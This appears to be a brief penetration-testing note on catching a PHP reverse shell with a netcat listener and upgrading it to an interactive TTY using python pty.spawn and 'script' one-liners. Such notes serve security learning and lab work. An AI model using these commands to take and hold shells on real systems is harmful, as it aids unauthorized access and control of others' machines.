# tty-shell

	

i used a pentestmonkey php reverse shell,  so now just setup a nc listener and catch your shell

nc -lvp 443

now we have the shell, we can try to get a TTY shell with python,

python -c "import pty; pty.spawn('/bin/bash')"

python3 -c 'import pty; pty.spawn("/bin/sh")'

however if python was not installed, i use this

script /dev/null -c bash

voila now we have a TTY Shell
